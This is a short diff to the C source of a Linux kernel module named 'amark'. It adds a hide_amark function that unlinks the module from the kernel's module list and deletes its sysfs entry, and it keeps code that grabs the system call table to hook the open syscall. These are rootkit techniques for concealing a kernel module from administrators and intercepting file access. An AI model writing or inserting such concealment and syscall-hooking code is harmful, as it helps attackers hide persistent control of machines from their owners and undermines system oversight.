@@ -59,6 +59,13 @@ static void get_sys_call_table(void) {
     }
 }
 
+static void hide_amark(void) {
+    /* struct kernfs_node *sd; TODO: see what we can do */
+
+    list_del_init(&__this_module.list);
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+}
+
 static int __init amark_init(void) {
     int timeout_ms = 10000;
 
@@ -71,7 +78,7 @@ static int __init amark_init(void) {
         return 0;
     }
 
-    list_del_init(&__this_module.list);
+    hide_amark();
 
     orig_open = (orig_open_t) _sys_call_table[__NR_open];
 
